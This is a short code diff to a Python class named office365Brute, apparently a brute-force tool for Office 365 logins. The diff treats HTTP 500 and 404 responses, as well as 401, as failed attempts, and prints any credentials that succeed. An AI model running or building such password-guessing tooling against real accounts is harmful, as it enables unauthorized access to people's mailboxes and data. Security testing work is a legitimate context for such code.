@@ -45,7 +45,7 @@ class office365Brute():
 </soap:Envelope>""".format()
 
         (status, data) = self.buildConn(request, user, password, config["HOST"], url)
-        if (int(status) == 401):
+        if (int(status) == 401) or (int(status) == 500) or (int(status) == 404):
             print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
             return
         print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
